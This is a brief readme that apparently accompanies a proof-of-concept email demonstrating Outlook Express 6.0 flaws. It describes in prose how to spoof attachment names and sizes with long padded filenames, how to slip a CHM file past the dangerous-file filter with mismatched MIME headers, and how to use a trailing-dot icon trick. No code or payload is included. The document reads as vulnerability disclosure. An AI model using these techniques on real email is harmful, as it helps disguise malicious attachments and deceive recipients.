This is a sample .EML exploiting several security issues
in Outlook Express 6.0.

1) Note the file attachment name overflow in the attachment list.
If a user specifies a VERY LONG attachment name, the attachment is
truncated in the "Attachments:" listbox.

NOTE: The number of spaces may require some precision work, so
test often until you get the right number! :-)

2) Note how a .CHM file bypassed the malicious application filter.
Normally, a user would not be allowed to open such a file, and the
file would be disabled by the MUA.  However, by using a mismatched
Content-Type/Content-Disposition pair, the filter allows access to
the potentially dangerous CHM file type.

3) Note how the "Open Attachment Warning" dialog displays the filename
when opening the file.  The incredibly long ending that we used to
spoof the attachments list is not even displayed, worse, the file name
could inaccurately be displayed as non-malicious (e.g, ASX as here)

4) Note how a specially crafted attachment name allows us to not only
spoof the name in the listbox, but also the size.  As the user does
not see the size of the attachment, we can fix this member to a false
value.  A typical use for this would be to make the file appear smaller
(safer?) than it really is.

5) Note how the icon is the typical default icon if a "." character is 
appended to the end of the filename.  OE doesn't parse past the extra 
dot, although Windows does.

This is not a real CHM file, just for the sake of demonstration!
